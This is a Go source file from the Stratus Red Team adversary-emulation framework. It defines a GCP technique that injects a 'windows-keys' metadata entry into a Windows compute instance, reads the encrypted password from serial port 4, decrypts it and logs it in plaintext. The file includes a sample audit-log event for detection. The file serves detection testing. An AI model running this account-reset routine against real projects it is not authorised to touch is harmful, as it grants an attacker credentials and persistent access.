package gcp

import (
    "context"
    _ "embed"
    "fmt"
    "log"
    "time"
    "strings"
    "crypto/rand"
    "crypto/rsa"
    "crypto/sha1"
    "encoding/base64"
    "encoding/binary"
    "encoding/json"
    "google.golang.org/api/compute/v1"
    gcp_utils "github.com/datadog/stratus-red-team/v2/internal/utils/gcp"
    "github.com/datadog/stratus-red-team/v2/pkg/stratus"
    "github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
)

type WindowsKeyJson struct {
    ExpireOn    string 
    Exponent    string 
    Modulus     string 
    UserName    string 
}

type CredsJson struct {
    ErrorMessage        string `json:"errorMessage,omitempty"`
    EncryptedPassword   string `json:"encryptedPassword,omitempty"`
    Modulus             string `json:"modulus,omitempty"`
}

//go:embed main.tf
var tf []byte

func init() {
    const CodeBlock = "```"
    const AttackTechniqueId = "gcp.lateral-movement.reset-windows-account"

    stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
        ID:           AttackTechniqueId,
        FriendlyName: "Resetting or creating windows account",
        Description: `
Resetting existing windows account or create the account if it does not exist.

Warm-up: 

- Create a compute instance (Windows)

Detonation:

- Create RSA key-pair (private key and public key)
- Request to reset windows account on compute instance
- Fetch and decrypt the password from compute instance.

Windows need few minutes to finish all setup after provisioning. So if the detonation fails, please wait for few minutes and try again.

Reference:

- https://cloud.google.com/sdk/gcloud/reference/compute/reset-windows-password
`,
        Detection: `
Resetting windows account is detected as 'compute.instances.setMetadata' in Cloud Logging

Sample event (shortened for readability):

` + CodeBlock + `json
{
  "logName": "projects/my-project-id/logs/cloudaudit.googleapis.com%2Factivity",
  "protoPayload": {
    "authenticationInfo": {
      "principalEmail": "username@service.com",
    },
    "metadata": {
      "instanceMetadataDelta": {
        "addedMetadataKeys": [
          "windows-keys public-key-here",
        ],
      },
    },
    "methodName": "v1.compute.instances.setMetadata",
    "resourceName": "projects/my-project-id/zones/my-zone-id/instances/my-instance-id",
    "serviceName": "compute.googleapis.com",
  },
  "resource": {
    "type": "gce_instance"
  },
  "severity": "NOTICE"
}
` + CodeBlock + `
`,
        Platform:                   stratus.GCP,
        IsIdempotent:               true,
        MitreAttackTactics:         []mitreattack.Tactic{ 
            mitreattack.LateralMovement, 
            mitreattack.Persistence },
        PrerequisitesTerraformCode: tf,
        Detonate:                   detonate,
    })
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
    gcp := providers.GCP()
    ctx := context.Background()

    projectId    := gcp.GetProjectId()
    zone         := params["zone"]
    instanceName := params["instance_name"]
    instanceIp   := params["instance_ip"]
    username     := "stratus"

    log.Printf("attempting to reset windows account '%s'\n", username)

    // create compute service
    service, err := compute.NewService(ctx, gcp.Options())
    if err != nil {
        return fmt.Errorf("Failed to create compute service: %v", err)
    }

    // get instance information
    instance, err := service.Instances.Get(projectId, zone, instanceName).Do()
    if err != nil {
        return fmt.Errorf("Failed to get instance information: %v", err)
    }

    log.Println("generating public/private key pair for user")

    // generating RSA public/private key pair
    key, err := rsa.GenerateKey(rand.Reader, 4096)
    if err != nil {
        return fmt.Errorf("Failed to generate RSA key-pair: %v", err)
    }
    
    // generate windows key in JSON
    winkey, err := GenerateWindowsKey(&key.PublicKey, username)
    if err != nil {
        return fmt.Errorf("Failed to generate key for windows account: %v", err)
    }

    data, err := json.Marshal(winkey)
    if err != nil {
        return fmt.Errorf("Failed to create JSON: %v", err)
    }

    log.Println("registering key to compute instance")

    // add winkeys to metadata
    md := instance.Metadata
    gcp_utils.InsertToMetadata(md, "windows-keys", string(data))

    if _, err := service.Instances.SetMetadata(projectId, zone, instanceName, md).Do(); err != nil {
        return fmt.Errorf("Failed to setting metadata: %v", err)
    }

    log.Println("fetching encrypted password")

    // fetch the password
    ep, err := FetchEncryptedPassword(service, projectId, zone, instanceName, winkey.Modulus)
    if err != nil {
        return fmt.Errorf("Failed to access serial port: %v", err)
    } 

    log.Println("decrypting password")

    password, err := DecryptPassword(key, ep)
    if err != nil {
        return fmt.Errorf("Failed to decrypt the password: %v", err)
    }

    log.Printf("instance: %s (%s) | username: %s | password: %s\n", instanceName, instanceIp, username, password)

    return nil
}

// generate windows Key in JSON
func GenerateWindowsKey(priv *rsa.PublicKey, username string) (*WindowsKeyJson, error) {
    bs := make([]byte, 4)
    binary.BigEndian.PutUint32(bs, uint32(priv.E))

    return &WindowsKeyJson{
        ExpireOn:   time.Now().Add(5 * time.Minute).Format(time.RFC3339),
        Exponent:   base64.StdEncoding.EncodeToString(bs),
        Modulus:    base64.StdEncoding.EncodeToString(priv.N.Bytes()),
        UserName:   username,
    }, nil 
}

// fetch encrypted password from serial port (4)
func FetchEncryptedPassword(service *compute.Service, project string, zone string, instanceName string, mod string) (string, error) {
	// limit to 10 attempts to read the serial port
	for attempt := 0; attempt < 10; attempt++ {
        // wait for 1 second before next attempt
        time.Sleep(1 * time.Second)
        
        // get serial port (4) which will give the result
        out, err := service.Instances.GetSerialPortOutput(project, zone, instanceName).Port(4).Do()
        if err == nil {
			for _, line := range strings.Split(out.Contents, "\n") {
				var creds CredsJson 
		
				err := json.Unmarshal([]byte(line), &creds)
				if err != nil {
					continue 
				} 
				
				if creds.Modulus == mod {
					if creds.ErrorMessage != "" {
						continue
					}
					return creds.EncryptedPassword, nil 
				}
			}
        }
    }

	return "", fmt.Errorf("failed to get response")
}

// decrypt password using generated RSA public/private key pair
func DecryptPassword(priv *rsa.PrivateKey, ep string) (string, error) {
    bp, err := base64.StdEncoding.DecodeString(ep)
    if err != nil {
        return "", err
    }

    pwd, err := rsa.DecryptOAEP(sha1.New(), rand.Reader, priv, bp, nil)
    if err != nil {
        return "", err
    }

    return string(pwd), nil 
}